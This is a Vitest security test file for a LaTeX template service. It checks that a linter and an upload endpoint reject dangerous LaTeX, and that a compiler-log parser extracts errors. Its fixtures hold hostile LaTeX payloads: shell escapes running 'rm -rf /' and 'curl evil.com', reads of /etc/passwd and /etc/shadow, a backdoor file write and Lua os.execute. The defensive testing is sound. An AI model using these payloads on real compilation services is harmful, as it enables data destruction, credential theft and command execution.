/**
 * Security Penetration & Vulnerability Tests for LaTeX Execution & Linting.
 * Complies with tasks BE-3.04, BE-3.21, BE-3.22, BE-3.24, and BE-3.27.
 */

import { describe, it, expect } from 'vitest'
import request from 'supertest'
import { app } from '../src/app.js'
import { generateTestToken } from './helpers/jwt.js'
import { lintTemplate } from '../src/latex/linter.js'
import { parseLatexErrors } from '../src/latex/logParser.js'

describe('Security Penetration & Linter Protection (BE-3.04, BE-3.24, BE-3.27)', () => {
  const maliciousSnippets = [
    { name: 'Shell escape \\write18', code: '\\write18{rm -rf /}' },
    { name: 'LaTeX3 shell execution', code: '\\sys_shell_now:n {curl evil.com}' },
    { name: 'File inclusion \\input', code: '\\input{/etc/passwd}' },
    { name: 'File inclusion \\include', code: '\\include{../../sensitive.tex}' },
    { name: 'File read \\openin', code: '\\openin 1=/etc/shadow' },
    { name: 'Stream read \\read', code: '\\read 1 to \\mysecret' },
    { name: 'File write \\openout', code: '\\openout 1=/tmp/backdoor' },
    { name: 'Stream write \\newwrite', code: '\\newwrite\\out' },
    { name: 'Direct Lua execution', code: '\\directlua{os.execute("whoami")}' },
    { name: 'Catcode mutation', code: '\\catcode`\\%=11' },
    { name: 'Dynamic control sequence \\csname', code: '\\csname input\\endcsname' },
  ]

  for (const snippet of maliciousSnippets) {
    it(`linter flags and blocks malicious primitive: ${snippet.name} (BE-3.04, BE-3.27)`, () => {
      const template = `\\documentclass{article}
\\begin{document}
{{FULL_NAME}}
${snippet.code}
\\end{document}`

      const result = lintTemplate(template)
      expect(result.valid).toBe(false)
      expect(result.errors.length).toBeGreaterThan(0)
      expect(result.errors.some((err) => err.includes('Security error'))).toBe(true)
    })
  }

  it('rejects malicious template injection via POST /api/v1/templates (BE-3.27)', async () => {
    const token = await generateTestToken({ sub: 'usr_sec_pen_tester' })
    const maliciousTemplate = `\\documentclass{article}
\\begin{document}
{{FULL_NAME}}
\\write18{cat /etc/passwd}
\\end{document}`

    const res = await request(app)
      .post('/api/v1/templates')
      .set('Authorization', `Bearer ${token}`)
      .send({
        name: 'Malicious Injected Template',
        latexCode: maliciousTemplate,
      })

    expect(res.status).toBe(400)
    expect(res.body.success).toBe(false)
    expect(JSON.stringify(res.body)).toContain('Security error: Shell escape command')
  })

  describe('Compiler Log Output Parser (BE-3.24)', () => {
    it('parses standard LaTeX error with line number and message', () => {
      const rawLog = `
This is pdfTeX, Version 3.141592653-2.6-1.40.24 (TeX Live 2022/Debian)
(./document.tex
! Undefined control sequence.
l.15 \\someUndefinedCommand
                         {test}
Here is how much of TeX's memory you used:
`
      const errors = parseLatexErrors(rawLog)
      expect(errors.length).toBe(1)
      expect(errors[0]!.message).toBe('Undefined control sequence.')
      expect(errors[0]!.line).toBe(15)
      expect(errors[0]!.context).toContain('\\someUndefinedCommand')
    })

    it('parses multiple errors in compilation log', () => {
      const rawLog = `
! Undefined control sequence.
l.12 \\foo
! LaTeX Error: Missing \\begin{document}.
l.20 \\bar
`
      const errors = parseLatexErrors(rawLog)
      expect(errors.length).toBe(2)
      expect(errors[0]!.message).toBe('Undefined control sequence.')
      expect(errors[0]!.line).toBe(12)
      expect(errors[1]!.message).toBe('LaTeX Error: Missing \\begin{document}.')
      expect(errors[1]!.line).toBe(20)
    })

    it('handles emergency stop cleanly without line number', () => {
      const rawLog = `
! Emergency stop.
Fatal error occurred, no output PDF file produced!
`
      const errors = parseLatexErrors(rawLog)
      expect(errors.length).toBe(1)
      expect(errors[0]!.message).toBe('Emergency stop.')
    })
  })
})
